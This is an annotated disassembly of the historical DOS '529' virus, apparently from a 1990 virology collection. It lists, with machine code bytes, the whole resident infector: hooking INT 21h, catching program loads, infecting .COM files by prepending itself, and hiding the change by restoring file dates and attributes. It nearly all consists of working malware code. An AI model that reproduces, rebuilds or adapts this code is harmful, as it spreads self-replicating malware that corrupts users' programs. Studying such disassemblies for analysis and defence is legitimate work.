; virus 529 extracted from full memory dump published by N.N.Bezrukov
; in Virus Guide (Computer Virology) edition 3.5. First information about this
; virus has been released by D.N.Lozinsky (Leningrad USSR) before june 1990.
;
; Dissasembly: A.Kadlof 1990-08-31
;
; Virus code is placed at the begining of the file

0100 B815CA	   MOV	   AX,CA15    ; is resident part alredy instaled?
0103 8B361B01	   MOV	   SI,[011B]  ; offset of oryginal first 529 bytes
0107 BF0001	   MOV	   DI,0100    ; begining of the file
010A 8B0E1D01	   MOV	   CX,[011D]  ; 0211h = 529 virus length
010E 8B1E1901	   MOV	   BX,[0119]  ; 0101h or less means: do not disable
0112 CD21	   INT	   21	      ; resident part of the virus

; if resident part of the virus is instaled then INT 21 with AX = CA15
; will start infected program, atherwise we will come here

0114 FF361F01	   PUSH    [011F]     ; jump to CS:0147
0118 C3 	   RET

;------------------
; virus date area

0119  01 01    ; flag - disable virus request
011B  D0 07    ; adress of oryginal 529 byte of the file, oryginal file length
	       ; plus 100h (size of memory image of file + PSP)
011D  11 02    ; virus length
011F  47 01    ; offset of virus code after working area
0121  79 00    ; ??
0123  C0 01
0125  04 00
0127  C4 01    ; offset of new INT 21h handler
0129  4D 00
012B  11 02 EA 00 FB	     ; ??
0130  02 01 00 FC 02 01 00   ; ??

; EXEC Parameter Block

0137  00 00	    ; segment of child enviroment
0139  80 00 0E 25   ; adress of command line
013D  5C 00 0E 25   ; adress of first FCB
013F  6C 00 0E 25   ; adress of second FCB

0145  CA 01	    ; offset of virus int 21h handler

;---------------------------------------------------------------
; continue instalation of virus if resident part is not present

0147 A11D01	   MOV	   AX,[011D]	; 0211h virus length
014A 051401	   ADD	   AX,0114	; AX := 325h length of buffer and
					; working area
014D 90 	   NOP
014E A30503	   MOV	   [0305],AX	; I/O buffer
0151 03061D01	   ADD	   AX,[011D]
0155 050001	   ADD	   AX,0100
0158 A30D03	   MOV	   [030D],AX
015B 8BE0	   MOV	   SP,AX
015D 050F00	   ADD	   AX,000F
0160 B104	   MOV	   CL,04
0162 D3E8	   SHR	   AX,CL
0164 A30F03	   MOV	   [030F],AX	; memory (in paragraphs) requested by
0167 06 	   PUSH    ES		; virus (64 paragraphs)

; capture INT 21h

0168 B82135	   MOV	   AX,3521    ; get INT 21h
016B CD21	   INT	   21

; store it

016D 8C06FF02	   MOV	   [02FF],ES
0171 891EFD02	   MOV	   [02FD],BX

0175 07 	   POP	   ES	      ; restore from the stack
0176 8B162701	   MOV	   DX,[0127]  ; offset of new INT 21h
017A B82125	   MOV	   AX,2521    ; set INT 21h
017D CD21	   INT	   21

017F 8B1E0F03	   MOV	   BX,[030F]  ; size of requested memory
0183 B44A	   MOV	   AH,4A      ; modify allocated memory block
0185 CD21	   INT	   21

0187 8CC0	   MOV	   AX,ES
0189 A33B01	   MOV	   [013B],AX  ; prepare EXEC Parameter Block
018C A33F01	   MOV	   [013F],AX
018F A34301	   MOV	   [0143],AX

0192 8E1E2C00	   MOV	   DS,[002C]  ; enviroment block
0196 33F6	   XOR	   SI,SI      ; point at the begining of block

0198 AC 	   LODSB
0199 0A04	   OR	   AL,[SI]    ; look for 0, 0 marker
019B 75FB	   JNZ	   0198

019D 83C603	   ADD	   SI,+03     ; point at full pathname
01A0 8BD6	   MOV	   DX,SI      ; offset of name of virus carrier
01A2 BB3701	   MOV	   BX,0137    ; adres of EXEC parameter block
01A5 B8004B	   MOV	   AX,4B00    ; Load & Execute
01A8 CD21	   INT	   21

01AA 8CC8	   MOV	   AX,CS
01AC 8ED0	   MOV	   SS,AX      ; restore stack pointers
01AE 2E 	   CS:
01AF 8B260D03	   MOV	   SP,[030D]
01B3 B44D	   MOV	   AH,4D      ; get return code of subprogram
01B5 CD21	   INT	   21

01B7 2E 	   CS:
01B8 8B160F03	   MOV	   DX,[030F]  ; needed number of paragraphs
01BC B431	   MOV	   AH,31      ; terminate but stay resident
01BE CD21	   INT	   21

01C0 B44C	   MOV	   AH,4C      ; terminate process
01C2 CD21	   INT	   21

;----------------------
; new INT 21h handler

01C4 2E 	   CS:
01C5 FF364501	   PUSH    [0145]    ; 01CA
01C9 C3 	   RET

01CA 3D15CA	   CMP	   AX,CA15   ; virus call?
01CD 7519	   JNZ	   01E8      ; no

01CF 2E 	   CS:
01D0 3B1E1901	   CMP	   BX,[0119] ; disable request?
01D4 7608	   JBE	   01DE      ; no

; disable resident part of virus

01D6 2E 	   CS:
01D7 C70645010C02  MOV	   WORD PTR [0145],020C
01DD CF 	   IRET

; return to infected file, first copy oryginal 529 bytes from the end of the
; file to the begining (registers should be prepared by caller)

01DE F3 	   REPZ
01DF A4 	   MOVSB

01E0 58 	   POP	   AX
01E1 B80001	   MOV	   AX,0100  ; new start adress
01E4 50 	   PUSH    AX
01E5 33C0	   XOR	   AX,AX
01E7 CF 	   IRET

; is it Load & Execute request?

01E8 3D004B	   CMP	   AX,4B00     ; Load & Execute
01EB 751F	   JNZ	   020C        ; no, jump to oryginal INT 21h

; check the name of loaded file (is it COM or not)

01ED 06 	   PUSH    ES
01EE 1E 	   PUSH    DS
01EF 07 	   POP	   ES
01F0 8BFA	   MOV	   DI,DX       ; name of loaded file
01F2 B9FFFF	   MOV	   CX,FFFF     ; length of searched block
01F5 F2 	   REPNZ
01F6 AE 	   SCASB	       ; AL = 0;
01F7 26 	   ES:
01F8 8A45FE	   MOV	   AL,[DI-02]  ; last letter of extension of name
01FB 0C20	   OR	   AL,20       ; convert to lower letter
01FD 3C6D	   CMP	   AL,6D       ; 'm' (is it COM?)
01FF 07 	   POP	   ES
0200 7505	   JNZ	   0207        ; no

0202 E80C00	   CALL    0211        ; infect loaded file

0205 EB03	   JMP	   020A

0207 E8F100	   CALL    02FB        ; CS:02FB  RET

020A 32C0	   XOR	   AL,AL

020C 2E 	   CS:
020D FF2EFD02	   JMP	   FAR [02FD]  ; oryginal INT 21h

;---------------------------
; Infection of the new file

0211 06 	   PUSH    ES
0212 50 	   PUSH    AX
0213 53 	   PUSH    BX
0214 1E 	   PUSH    DS
0215 52 	   PUSH    DX
0216 8BEC	   MOV	   BP,SP

0218 0E 	   PUSH    CS
0219 1F 	   POP	   DS

021A B82435	   MOV	   AX,3524     ; get INT 24h
021D CD21	   INT	   21

021F 8C060303	   MOV	   [0303],ES
0223 891E0103	   MOV	   [0301],BX

0227 BAF802	   MOV	   DX,02F8     ; offset of virus INT 24h handler
022A B82425	   MOV	   AX,2524     ; set interrupt vector 24h
022D CD21	   INT	   21

022F 1E 	   PUSH    DS
0230 8B5600	   MOV	   DX,[BP+00]  ; adress of loaded file name
0233 8E5E02	   MOV	   DS,[BP+02]
0236 B80043	   MOV	   AX,4300     ; get file attributes
0239 CD21	   INT	   21

023B 7250	   JB	   028D        ; problems

023D 2E 	   CS:
023E 890E0B03	   MOV	   [030B],CX   ; store current file attributes
0242 B80143	   MOV	   AX,4301     ; set file attributes
0245 33C9	   XOR	   CX,CX       ; clear all attributes
0247 CD21	   INT	   21

0249 7242	   JB	   028D        ; problems

024B B8023D	   MOV	   AX,3D02     ; open file for read\write
024E CD21	   INT	   21

0250 7274	   JB	   02C6        ; problems

0252 1F 	   POP	   DS
0253 8BD8	   MOV	   BX,AX
0255 B80057	   MOV	   AX,5700     ; get file date
0258 CD21	   INT	   21

025A 726A	   JB	   02C6        ; problems

025C 890E0703	   MOV	   [0307],CX   ; store time
0260 89160903	   MOV	   [0309],DX   ; store date

0264 8B160503	   MOV	   DX,[0305]   ; offset of buffer
0268 8B0E1D01	   MOV	   CX,[011D]   ; number of bytes to read (full virus)
026C B43F	   MOV	   AH,3F       ; read from file
026E CD21	   INT	   21

0270 7254	   JB	   02C6        ; problems

0272 3BC1	   CMP	   AX,CX       ; check for I/O problems
0274 7550	   JNZ	   02C6        ; problems

; compare first 19h bytes (25) to check is file alredy infected

0276 0E 	   PUSH    CS
0277 07 	   POP	   ES
0278 BF0001	   MOV	   DI,0100
027B 8BF2	   MOV	   SI,DX
027D B91900	   MOV	   CX,0019
0280 F3 	   REPZ
0281 A6 	   CMPSB
0282 7442	   JZ	   02C6       ; file infected

0284 B80242	   MOV	   AX,4202    ; move file pointer
0287 33C9	   XOR	   CX,CX      ; to the end of file
0289 8BD1	   MOV	   DX,CX      ; CX:DX = 0
028B CD21	   INT	   21

028D 7237	   JB	   02C6        ; problems

028F 0BD2	   OR	   DX,DX       ; file over 64 Kb
0291 7533	   JNZ	   02C6        ; problems

0293 050001	   ADD	   AX,0100
0296 A31B01	   MOV	   [011B],AX
0299 3D00F0	   CMP	   AX,F000
029C 7728	   JA	   02C6        ; file to big

029E 3DD007	   CMP	   AX,07D0     ; file to small
02A1 7223	   JB	   02C6        ; problems

02A3 8B0E1D01	   MOV	   CX,[011D]   ; number of bytes
02A7 8B160503	   MOV	   DX,[0305]   ; offset of disk I/O buffer
02AB B440	   MOV	   AH,40       ; write to file
02AD CD21	   INT	   21

02AF 7215	   JB	   02C6        ; problems

02B1 B80042	   MOV	   AX,4200     ; move file pointer
02B4 33D2	   XOR	   DX,DX       ; to the beginning of file
02B6 8BCA	   MOV	   CX,DX       ; CX:DX = 0
02B8 CD21	   INT	   21

02BA 720A	   JB	   02C6        ; problems

02BC FEC6	   INC	   DH
02BE 8B0E1D01	   MOV	   CX,[011D]   ; number of bytes
02C2 B440	   MOV	   AH,40       ; write to file
02C4 CD21	   INT	   21

;----------------------------------
; exit if any troubles or when done

02C6 B80157	   MOV	   AX,5701     ; set file time and date
02C9 8B0E0703	   MOV	   CX,[0307]   ; recall time
02CD 8B160903	   MOV	   DX,[0309]   ; recall data
02D1 CD21	   INT	   21

02D3 B43E	   MOV	   AH,3E       ; Close file (BX = handle)
02D5 CD21	   INT	   21

02D7 B80143	   MOV	   AX,4301     ; set file attributes
02DA 8B0E0B03	   MOV	   CX,[030B]   ; recall attributes
02DE 8E5E02	   MOV	   DS,[BP+02]  ; segment of file name (ASCIIZ)
02E1 8B5600	   MOV	   DX,[BP+00]  ; offset of file name (ASCIIZ)
02E4 CD21	   INT	   21

02E6 2E 	   CS:
02E7 C5160103	   LDS	   DX,[0301]
02EB B82425	   MOV	   AX,2524     ; restore INT 24h
02EE CD21	   INT	   21

02F0 8BE5	   MOV	   SP,BP
02F2 5A 	   POP	   DX
02F3 1F 	   POP	   DS
02F4 5B 	   POP	   BX
02F5 58 	   POP	   AX
02F6 07 	   POP	   ES
02F7 C3 	   RET

;----------------------------------
; INT 24h handler during infection

02F8 B003	   MOV	   AL,03
02FA CF 	   IRET

02FB C3 	   RET

02FC C3 	   RET

;--------------
; date holder

02FD  5C 06 FD 18   ; old INT 21h holder
0301  56 05 9D 10   ; old INT 24h holder
0305  25 03	    ; offset of disk I/O buffer
0307  36 00	    ; file time
0309  21 00	    ; file date
030B  20 00	    ; file attributes
030D  36 06	    ; SP holder
030F  64 00	    ; segment-paragraph just beyond the end of resident part

0325  ; I/O bufer

